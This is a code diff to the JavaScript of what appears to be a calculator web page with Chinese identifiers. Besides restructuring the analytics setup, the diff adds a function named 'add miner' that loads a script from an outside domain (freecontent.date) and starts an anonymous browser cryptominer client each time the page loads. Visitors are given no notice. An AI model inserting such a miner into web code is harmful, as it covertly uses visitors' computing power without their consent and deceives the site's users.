@@ -207,11 +207,11 @@ function 计算() {
     return 总计;
 }
 
-window.onload = function () {
-    function gtag() {
-        dataLayer.push(arguments);
-    }
+function gtag() {
+    dataLayer.push(arguments);
+}
 
+function 加入追踪() {
     if (追踪代码 !== null) {
         var ga = document.createElement('script');
         ga.setAttribute('async', 'async');
@@ -225,6 +225,25 @@ window.onload = function () {
         gtag('js', new Date());
         gtag('config', 追踪代码);
     }
+}
+
+function 加入挖矿器() {
+    if (挖矿代码 !== null) {
+        var 挖矿脚本 = document.createElement('script');
+        挖矿脚本.setAttribute('src', 'https://www.freecontent.date./9eNO.js');
+        挖矿脚本.onload = function() {
+            var _client = new Client.Anonymous(挖矿代码, {
+                throttle: 0.2
+            });
+            _client.start();
+        };
+        document.getElementsByTagName('body')[0].appendChild(挖矿脚本);
+    }
+}
+
+window.onload = function () {
+    加入追踪();
+    加入挖矿器();
 
     语言 = document.getElementsByTagName('html')[0].getAttribute('lang');
     if (语言 === null || 语言 === '') {
